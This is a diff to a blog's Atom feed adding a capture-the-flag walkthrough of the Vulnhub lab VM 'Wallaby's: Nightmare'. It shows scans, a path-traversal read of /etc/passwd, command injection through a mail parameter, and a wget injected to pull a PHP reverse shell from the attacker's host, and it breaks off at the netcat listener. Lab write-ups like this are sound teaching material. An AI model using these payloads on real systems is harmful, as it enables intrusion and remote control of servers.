@@ -1,4 +1,458 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-07-14T21:54:01+02:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Dudek - Polish Cipher Machine</title><link href="http://localhost:4000/tgs-1-dudek/" rel="alternate" type="text/html" title="Dudek - Polish Cipher Machine" /><published>2017-07-04T10:00:00+02:00</published><updated>2017-07-04T10:00:00+02:00</updated><id>http://localhost:4000/tgs-1-dudek</id><content type="html" xml:base="http://localhost:4000/tgs-1-dudek/">&lt;h1&gt;Let's hear the history&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-07-16T16:07:07+02:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - Wallaby’s: Nightmare</title><link href="http://localhost:4000/vulnhub-wallabys-nightmare/" rel="alternate" type="text/html" title="Vulnhub.com - Wallaby's: Nightmare" /><published>2017-07-16T10:00:00+02:00</published><updated>2017-07-16T10:00:00+02:00</updated><id>http://localhost:4000/vulnhub-wallabys-nightmare</id><content type="html" xml:base="http://localhost:4000/vulnhub-wallabys-nightmare/">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Today we're going to play with another machine called &lt;b&gt;Wallaby's: Nightmare&lt;/b&gt;. Here's the description: &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;This is my first CTF/Vulnerable VM ever. I created it both for educational purposes and so people can have a little fun testing their skills in a legal, pentest lab environment.
+
+Some notes before you download!
+
+    Try to use a Host-Only Adapter. This is an intentionally vulnerable machine and leaving it open on your network can have bad results.
+    It should work with Vmware flawlessly. I've tested it with vbox and had one other friend test it on Vbox as well so I think it should work just fine on anything else.
+
+This is a Boot2Root machine. The goal is for you to attempt to attempt to gain root privileges in the VM. Do not try to get the root flag through a recovery iso etc, this is essentially cheating! The idea is to get through by pretending this machine is being attacked over a network with no physical access.
+
+I themed this machine to make it feel a bit more realistic. You are breaking into a fictional characters server (named Wallaby) and trying to gain root without him noticing, or else the difficulty level will increase if you make the wrong move! Good luck and I hope you guys enjoy!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1&gt;Challenge&lt;/h1&gt;
+
+&lt;p&gt;As always, we're going to start from finding an IP address of the machine using Nmap. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap 192.168.56.102/24
+
+Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 08:14 EDT
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.1
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000062s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+All 1000 scanned ports on 192.168.56.1 are closed
+MAC Address: 0A:00:27:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.100
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00011s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+All 1000 scanned ports on 192.168.56.100 are filtered
+MAC Address: 08:00:27:29:FD:0E &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00056s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 997 closed ports
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+6667/tcp filtered irc
+MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0000050s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+All 1000 scanned ports on 192.168.56.102 are closed
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;6.10 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can start the fun from looking at the http port, there's always something interesting in the website. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/first-look.png&quot; alt=&quot;First Look&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hmmm, prompt asking us for a username. Let's enter something and see what happens. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/website-inside.png&quot; alt=&quot;Website - the inside&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see it's a simple introducion to the ctf. As a standart part of checking everything, I have found XSS in the form, but it won't help us for now. We can start digging further by clicking on &lt;b&gt;start the ctf&lt;/b&gt; link, which moves us to a new page. And what is good for us, is that it uses the GET parameter to display the file.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101/?page=home&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Maybe it's vulnerable to Local File Intrusion? Let's check this by trying to get the content of &lt;b&gt;/etc/passwd&lt;/b&gt; file. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101/?page=../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
+steven?:x:1001:1001::/home/steven?:/bin/bash
+ircd:x:1003:1003:,,,:/home/ircd:/bin/bash&lt;span class=&quot;c&quot;&gt;&amp;lt;!--This is what we call 'dis-information' in the cyber security world!  Are you learning anything new here bobby
+?--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we have the &lt;b&gt;/etc/passwd&lt;/b&gt; file. But after trying to grab &lt;b&gt;/etc/shadow&lt;/b&gt;, website presented us this with this nice info and connection was dropped. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;view-source:http://192.168.56.101/?page=../../../etc/shadow
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;That's some fishy stuff you're trying there &lt;span class=&quot;nt&quot;&gt;&amp;lt;em&amp;gt;&lt;/span&gt;bobby
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/em&amp;gt;&lt;/span&gt;buddy.  You must think Wallaby codes like a monkey!  I better get to securing this SQLi though...&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;(Wallaby caught you trying an LFI, you gotta be sneakier!  Difficulty level has increased.)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Doing the Nmap scan showed us that the port 80 is no longer there. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap 192.168.56.101
+
+Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 08:21 EDT
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00019s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 998 closed ports
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+6667/tcp filtered irc
+MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.46 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But another scan, with bigger port range, showed new http service, running on port &lt;b&gt;60080&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap -p- 192.168.56.101
+
+Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 08:22 EDT
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0055s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 65532 closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+6667/tcp  filtered irc
+60080/tcp open     unknown
+MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5.15 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Another website! &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/another-website.png&quot; alt=&quot;Port 60080 website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Unfortunately there were no clues in the image, as I thought at first. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.101:60080/sec.png
+
+&lt;span class=&quot;gp&quot;&gt;root@kali:~/Downloads# &lt;/span&gt;exiftool index.png
+ExifTool Version Number         : 10.40
+File Name                       : index.png
+Directory                       : .
+File Size                       : 56 kB
+File Modification Date/Time     : 2017:07:15 08:24:56-04:00
+File Access Date/Time           : 2017:07:15 08:25:17-04:00
+File Inode Change Date/Time     : 2017:07:15 08:24:56-04:00
+File Permissions                : rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 600
+Image Height                    : 400
+Bit Depth                       : 8
+Color Type                      : RGB
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Software                        : Adobe ImageReady
+XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
+Creator Tool                    : Adobe Photoshop CS5 Windows
+Instance ID                     : xmp.iid:04130E655CDC11E08DFECD5B48C7E53A
+Document ID                     : xmp.did:04130E665CDC11E08DFECD5B48C7E53A
+Derived From Instance ID        : xmp.iid:04130E635CDC11E08DFECD5B48C7E53A
+Derived From Document ID        : xmp.did:04130E645CDC11E08DFECD5B48C7E53A
+Image Size                      : 600x400
+Megapixels                      : 0.240&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If you don't know what to do, do a Nikto scan! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nikto -h 192.168.56.101:60080
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.101
++ Target Hostname:    192.168.56.101
++ Target Port:        60080
++ Start Time:         2017-07-15 08:28:56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Web Server returns a valid response with junk HTTP methods, this may cause &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives.
++ /index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;probably Rocket, but could be any index.php&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7537 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 7 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2017-07-15 08:29:23 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;27 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hey, it's the same vulnerability as in the previous page. Let's exploit it once again. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101:60080/index.php?page=index.php
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Dude, &lt;span class=&quot;nt&quot;&gt;&amp;lt;em&amp;gt;&lt;/span&gt;bobby&lt;span class=&quot;nt&quot;&gt;&amp;lt;/em&amp;gt;&lt;/span&gt; what are you trying over here?!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I'm running a dirbuster! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;dirb http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /usr/share/dirb/wordlists/big.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Jul 15 08:36:59 2017
+URL_BASE: http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt
+
+-----------------
+
+GENERATED WORDS: 20458                                                         
+
+---- Scanning URL: http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ----
++ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;blacklist &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:992&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;              
++ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cgi-bin/ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:898&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;               
++ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;contact &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:895&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                
++ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;home &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1145&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                  
++ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;index &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1360&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                 
++ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mailer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1083&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                
+                                                                               
+-----------------
+END_TIME: Sat Jul 15 08:37:24 2017
+DOWNLOADED: 20458 - FOUND: 6&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can now manually go through these pages to look for anything interesting. There's nothing in the contact...&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.101:60080/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;contact
+
+Contact me with all your whining at wallaby@wallaby.wallaby.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But mailer, mailer is interesting. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101:60080/index.php?page=mailer
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'color:blue;'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Coming Soon guys!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;&amp;lt;!--a href='/?page=mailer&amp;amp;mail=mail wallaby &quot;message goes here&quot;'&amp;gt;&amp;lt;button type='button'&amp;gt;Sendmail&amp;lt;/button--&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;&amp;lt;!--Better finish implementing this so bobby can send me all his loser complaints!--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And by trial and error, I've found that it's even vulnerable to command injection. Let's check that! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101:60080/?page=mailer&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;mail=uname%20-a
+Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Our plan is to upload a &lt;b&gt;PHP Reverse Shell&lt;/b&gt; to the machine. Firstly, let's copy it, so then we can modify the code. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/web# &lt;/span&gt;cp /usr/share/webshells/php/php-reverse-shell.php ~/web&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;set_time_limit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'192.168.56.102'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chunk_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$write_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$error_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname -a; w; id; /bin/sh -i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$daemon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now, we're ready to upload the file on Python SimpleHTTPServer. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/web# &lt;/span&gt;python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we can use &lt;b&gt;wget&lt;/b&gt; to download the shell on our victim machine. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mailer&amp;amp;mail&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;wget%20192.168.56.102:8000/shell.php
+http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mailer&amp;amp;mail&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ls
+
+eye.jpg index.php s13!34g&lt;span class=&quot;nv&quot;&gt;$3FVA5e&lt;/span&gt;@ed sec.png shell.php uname.txt &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now start the netcat listener and navigate to the shell.php file. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nc -nvlp 1234
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
